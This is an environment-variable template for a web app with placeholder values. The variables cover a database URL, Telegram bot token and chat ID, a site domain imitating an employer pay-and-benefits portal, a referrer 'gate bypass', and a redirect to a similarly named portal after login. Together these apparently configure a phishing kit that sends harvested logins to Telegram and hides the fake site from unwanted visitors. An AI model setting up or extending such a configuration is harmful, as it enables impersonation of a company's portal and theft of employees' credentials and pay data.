# Neon PostgreSQL connection string
DATABASE_URL=postgresql://user:pass@host/dbname?sslmode=require

# Telegram bot tokens and chat IDs (comma-separated for multiple)
TELEGRAM_BOT_TOKEN=123456:ABC-DEF
TELEGRAM_CHAT_ID=123456789

# Domain for the site (used in SEO meta tags)
NEXT_PUBLIC_SITE_URL=https://targetpaymentbenefits.com

# Optional: referrer domain for gate bypass
GATE_REFERRER=targetpaymentbenefits.com

# Optional: redirect URL after login-out
PORTAL_REDIRECT_URL=https://targetpayandbenefits.com

# Railway sets PORT automatically — do not set it manually
